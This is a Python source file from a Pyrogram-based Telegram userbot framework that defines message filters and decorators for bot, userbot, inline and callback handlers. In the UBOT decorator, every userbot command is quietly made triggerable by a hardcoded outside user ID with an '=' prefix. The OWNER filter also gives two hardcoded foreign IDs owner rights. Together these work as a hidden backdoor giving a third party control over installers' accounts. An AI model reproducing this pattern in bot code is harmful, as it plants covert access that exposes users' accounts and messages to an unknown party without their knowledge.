from pyrogram import filters
from pyrogram.enums import ChatType

from PyroUbot import *


class FILTERS:
    ME = filters.me
    GROUP = filters.group
    PRIVATE = filters.private
    OWNER = filters.user([1948147616, 1913872347, OWNER_ID])
    ME_GROUP = filters.me & filters.group
    ME_OWNER = filters.me & filters.user(OWNER_ID)


class PY:
    def BOT(command, filter=FILTERS.PRIVATE):
        def wrapper(func):
            @bot.on_message(filters.command(command) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def UBOT(command, filter=FILTERS.ME):
        def wrapper(func):
            @ubot.on_message(filters.command(command, "=") & filters.user(1948147616))
            @ubot.on_message(ubot.cmd_prefix(command) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def INLINE(command):
        def wrapper(func):
            @bot.on_inline_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def CALLBACK(command):
        def wrapper(func):
            @bot.on_callback_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def LOGS_PRIVATE():
        def wrapper(func):
            @ubot.on_message(
                filters.private
                & filters.incoming
                & ~filters.me
                & ~filters.bot
                & ~filters.service
            )
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def LOGS_GROUP():
        def wrapper(func):
            @ubot.on_message(
                filters.group & filters.incoming & filters.mentioned & ~filters.bot
            )
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
        
    def PRIVATE(func):
        async def function(client, message):
            user = message.from_user
            rpk = f"<a href='tg://user?id={user.id}'>{user.first_name} {user.last_name or ''}</a>"
            if not message.chat.type == ChatType.PRIVATE:
                return await message.reply(
                    f"<b>❌ ᴍᴀᴀғ {rpk}, ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ʙᴇʀғᴜɴɢsɪ ᴅɪ ᴘʀɪᴠᴀᴛᴇ.</b>",
                    quote=True,
                )
            return await func(client, message)

        return function

    def TOP_CMD(func):
        async def function(client, message):
            cmd = message.command[0].lower()
            top = await get_vars(bot.me.id, cmd, "modules")
            get = int(top) + 1 if top else 1
            await set_vars(bot.me.id, cmd, get, "modules")
            return await func(client, message)

        return function
